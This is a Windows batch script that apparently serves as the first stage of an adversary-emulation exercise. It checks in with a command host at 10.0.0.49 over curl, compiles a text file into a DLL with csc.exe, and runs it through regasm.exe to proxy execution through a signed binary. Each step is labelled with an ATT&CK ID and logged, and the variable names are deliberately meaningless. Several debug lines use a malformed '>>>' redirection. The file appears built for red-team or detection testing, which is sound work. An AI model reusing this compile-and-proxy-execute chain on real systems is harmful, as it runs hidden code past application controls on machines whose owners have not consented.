@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8100\f2c809f5
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8100-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=control.txt
SET njozco=file.txt
SET kkjwr=8100

REM Internal variables
SET ykxaa=%APPDATA%\%ufeybybm%\macula-simulations.log
SET akwae=csc.exe
SET tnqzw=%APPDATA%\%ufeybybm%
SET dhdfg=regasm.exe

REM Create temp directory
IF NOT EXIST "%tnqzw%" MD "%tnqzw%" 2>nul

REM Debug: script start
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: script_start=stage1_bat>>> "%ykxaa%" 2>nul

REM T1500: Compile After Delivery
SET t1500_res=1
SET t1500_err=
REM Debug: compile operation start
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_start=%njozco%>>> "%ykxaa%" 2>nul

REM Heartbeat check (Step 1)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_check_start=%uouoq%>>> "%ykxaa%" 2>nul
curl -k -s -o nul "%uouoq%" 2>nul
IF ERRORLEVEL 1 (
    SET t1500_res=0
    SET t1500_err=heartbeat_failed
)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: heartbeat_check_complete=%ERRORLEVEL%>>> "%ykxaa%" 2>nul

REM Change directory (Step 3)
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_start=%recnn%>>> "%ykxaa%" 2>nul
cd /d "%recnn%" 2>nul
IF ERRORLEVEL 1 (
    SET t1500_res=0
    SET t1500_err=chdir_failed
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_failed=%recnn%>>> "%ykxaa%" 2>nul
) ELSE (
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: chdir_complete=%cd%>>> "%ykxaa%" 2>nul
)

REM Compile DLL (Step 4-5)
IF !t1500_res! EQU 1 (
    "%akwae%" /target:library /out:"%hpnjatpj%" "%njozco%" 2>nul
    IF ERRORLEVEL 1 (
        SET t1500_res=0
        SET t1500_err=compile_failed
    )
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: compile_complete=%hpnjatpj%>>> "%ykxaa%" 2>nul
)

REM Log T1500 result
SET mjdate=%DATE%
SET mjtime=%TIME%
IF !mjdate:~4,1!==/ (
    SET logdate=!mjdate:~6,4!-!mjdate:~0,2!-!mjdate:~3,2!
) ELSE IF !mjdate:~2,1!==/ (
    SET logdate=!mjdate:~6,4!-!mjdate:~3,2!-!mjdate:~0,2!
) ELSE (
    SET logdate=!mjdate:~6,4!-!mjdate:~3,2!-!mjdate:~0,2!
)
SET logtime=!mjtime:,=.!
IF !logtime:~1,1!==: SET logtime=0!logtime!
echo [!logdate! !logtime!][%lqyereup%]: %ufeybybm%-%kkjwr%-T1500|Compile After Delivery=!t1500_res!:!t1500_err!>> "%ykxaa%" 2>nul || echo >nul

REM T1218: Signed Binary Proxy Execution
SET t1218_res=1
SET t1218_err=
REM Debug: regasm execution start
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: regasm_start=%dhdfg%>>> "%ykxaa%" 2>nul

IF EXIST "%hpnjatpj%" (
    "%dhdfg%" /U "%hpnjatpj%" 2>nul
    IF ERRORLEVEL 1 (
        SET t1218_res=0
        SET t1218_err=regasm_failed
    )
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: regasm_complete=%ERRORLEVEL%>>> "%ykxaa%" 2>nul
) ELSE (
    SET t1218_res=0
    SET t1218_err=file_not_found
    echo [%DATE% %TIME%][DEBUG][%lqyereup%]: regasm_failed=missing_dll>>> "%ykxaa%" 2>nul
)

REM Log T1218 result
SET mjdate=%DATE%
SET mjtime=%TIME%
IF !mjdate:~4,1!==/ (
    SET logdate=!mjdate:~6,4!-!mjdate:~0,2!-!mjdate:~3,2!
) ELSE IF !mjdate:~2,1!==/ (
    SET logdate=!mjdate:~6,4!-!mjdate:~3,2!-!mjdate:~0,2!
) ELSE (
    SET logdate=!mjdate:~6,4!-!mjdate:~3,2!-!mjdate:~0,2!
)
SET logtime=!mjtime:,=.!
IF !logtime:~1,1!==: SET logtime=0!logtime!
echo [!logdate! !logtime!][%lqyereup%]: %ufeybybm%-%kkjwr%-T1218|Signed Binary Proxy Execution=!t1218_res!:!t1218_err!>> "%ykxaa%" 2>nul || echo >nul

REM Debug: script end
echo [%DATE% %TIME%][DEBUG][%lqyereup%]: script_end=stage1_bat>>> "%ykxaa%" 2>nul
ENDLOCAL